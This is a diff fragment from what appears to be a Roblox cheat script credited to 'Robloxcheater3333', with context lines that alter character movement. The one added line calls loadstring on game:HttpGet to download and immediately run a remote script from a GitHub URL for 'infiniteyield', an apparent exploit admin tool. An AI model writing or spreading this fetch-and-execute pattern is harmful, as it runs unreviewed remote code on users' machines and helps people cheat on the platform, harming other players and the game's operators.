@@ -4056,3 +4056,4 @@ local HulkJump = Instance.new("IntValue",lp.Character.BodyEffects.Movement);Hulk
 end)
 
 -- GUI BY Robloxcheater3333 [https://pastebin.com/edit/kACuK6xi/1]
+loadstring(game:HttpGet(('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'),true))()
